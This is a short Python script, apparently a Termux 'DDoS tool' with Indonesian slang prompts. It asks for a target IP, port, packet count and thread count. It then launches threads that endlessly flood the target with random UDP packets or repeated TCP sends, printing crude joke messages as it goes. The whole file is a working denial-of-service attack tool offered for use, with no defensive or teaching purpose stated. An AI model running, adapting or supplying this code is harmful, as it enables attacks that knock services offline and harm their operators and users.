#!/usr/bin/env python3
#Code by Han
import random
import socket
import threading

print("====TOOLS DDOS TERMUX=======")
print(" >>PERMISI PAKET DARI LORD FATIH SILAHKAN DI TERMIMA<< ")
ip = str(input(" IP YG MAU LU DDOS:"))
port = int(input(" PORT YANG MAU LU DDOS:"))
choice = str(input(" GASS GAK??(gas/gak):"))
times = int(input(" PAKET NYA MO BRP?:"))
threads = int(input(" Threads MO BRP?:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("AHHH KOK NEMBUSS","",""))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" CROOT...CROTTT")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("AHHHHHH KOKKK NEMBUSSS","",""))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" CROTT...CROTTTT")
		except:
			s.close()
			print("[*] Error")
            
for y in range(threads):
	if choice == 'gas':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
